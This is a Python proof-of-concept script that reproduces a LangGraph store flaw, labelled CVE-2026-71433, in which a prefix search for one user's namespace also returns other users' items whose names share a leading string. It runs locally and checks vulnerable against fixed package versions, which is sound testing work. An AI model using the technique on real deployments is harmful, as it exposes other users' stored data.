"""Reproduction: CVE-2026-71433 (GHSA-47pj-3jcm-6whg), LangGraph SQLite/Postgres
store namespace-prefix matching crosses segment boundaries. Fixed in
langgraph-checkpoint-sqlite and langgraph-checkpoint-postgres 3.1.1.

Library level only: no server, no app. Run it in a SEPARATE environment that
has the store package installed.

SQLite (in memory, the default):
    pip install "langgraph-checkpoint-sqlite==3.1.0"  -> exits 7 (cross-user read)
    pip install "langgraph-checkpoint-sqlite==3.1.1"  -> exits 0 (isolated)

Postgres (set ST_PG_URI to an EMPTY database you own, on localhost):
    pip install "langgraph-checkpoint-postgres==3.1.0" "psycopg[binary]" psycopg-pool
    ST_PG_URI=postgresql://user@127.0.0.1:5432/emptydb python3 cve_2026_71433_store.py

The end-to-end check through a LangGraph server is real_server_store_gate.py.
"""
import importlib.metadata as m
import os
import sys

pg_uri = os.environ.get("ST_PG_URI")
try:
    if pg_uri:
        from langgraph.store.postgres import PostgresStore as Store
        package, target = "langgraph-checkpoint-postgres", pg_uri
    else:
        from langgraph.store.sqlite import SqliteStore as Store
        package, target = "langgraph-checkpoint-sqlite", ":memory:"
except Exception as exc:
    print("IMPORT-FAIL", exc)
    sys.exit(2)
version = m.version(package)

with Store.from_conn_string(target) as store:
    store.setup()
    # Three users whose ids share a leading string but are DIFFERENT segments.
    store.put(("alice",), "k", {"text": "ALICE-SECRET"})
    store.put(("alice-evil",), "k", {"text": "EVIL-SECRET"})
    store.put(("alicent",), "k", {"text": "ALICENT-SECRET"})
    hits = store.search(("alice",))
    names = sorted({".".join(i.namespace) for i in hits})
    texts = sorted({i.value.get("text") for i in hits})
    print(f"{package}={version}")
    print(f"alice searched prefix ('alice',) -> namespaces {names}")
    foreign = [t for t in texts if t not in (None, "ALICE-SECRET")]
    if foreign:
        print(f"CROSS-USER READ: alice also saw {foreign}")
        sys.exit(7)
    print("ISOLATED: alice saw only her own item")
    sys.exit(0)
